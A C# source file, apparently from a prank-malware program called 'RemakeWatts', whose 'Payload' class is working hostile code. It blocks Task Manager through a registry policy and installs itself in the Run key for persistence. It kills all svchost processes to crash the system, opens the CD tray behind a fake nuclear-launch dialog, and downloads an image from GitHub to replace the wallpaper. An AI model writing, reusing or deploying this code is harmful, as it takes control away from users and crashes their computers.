using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace RemakeWatts
{
    public class Payload
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int msciSendString(string ipstrCommand, string ipstrReturnString, int uReturnLenght, int hwndCallback);
        public void BlockTaskMngr()
        {
            RegistryKey blockTaskMgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (blockTaskMgr.GetValue("DisableTaskMgr") == null)
            {
                blockTaskMgr.SetValue("DisableTaskMgr", 1);
                blockTaskMgr.Close();
            }
        }
        public void AutoStart()
        {
            RegistryKey autoStart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            autoStart.SetValue("Papointeligencja", '"' + Application.StartupPath + '"' + "\\RemakeWatts.exe");
            autoStart.Close();
        }

        public void InsertNuclearKey() //Kody nuklearne
        {
            DialogResult dialog = MessageBox.Show("Insert Nuclear Key", "Launch nuclear warhead???", MessageBoxButtons.YesNo);
            if (dialog == DialogResult.Yes)
            {
                try
                {
                    int result = msciSendString("Set cdaudio door open wait", null, 0, 0);
                    Thread.Sleep(3000);
                    result = msciSendString("Set cdaudio door closed", null, 0, 0);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else
            {
                //Proceskrytyczny_blue_screen
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach (var proc in processes)
                {
                    proc.Kill();
                }
            }
        }

        public static String version()
        {
            System.Version version = new System.Version();

            return version.Major.ToString();
        }
        //Obrazek1
        public void payload1()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        //Obrazek2
        public void payload2()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        //Kody nuklearne
        public void payload3()
        {
            InsertNuclearKey();
        }
        //Pobieranie
        public void payload4()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new DownloadCodes());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        //Turbotacka
        public void payload5()
        {
            new Thread(() =>
            {
                MessageBox.Show(Payload.version());
                Download d = new Download();
                Wallpaper wallpaper = new Wallpaper();
                d.download("https://raw.githubusercontent.com/BONK220/Watykanczyk/master/maxresdefault.jpg", Application.StartupPath);
                Thread.Sleep(3000);
                wallpaper.SetWallpaper($"{Application.StartupPath}/maxresdefault.jpg");
            }).Start();
        }
    }

}
